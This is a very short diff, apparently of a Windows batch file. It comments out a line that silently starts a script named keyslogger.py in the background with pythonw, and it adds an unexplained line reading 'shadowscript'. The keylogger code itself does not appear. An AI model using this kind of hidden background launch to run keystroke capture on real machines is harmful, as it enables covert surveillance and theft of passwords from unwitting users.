@@ -1,1 +1,2 @@
-start /B pythonw keyslogger.py
+@REM start /B pythonw keyslogger.py
+shadowscript
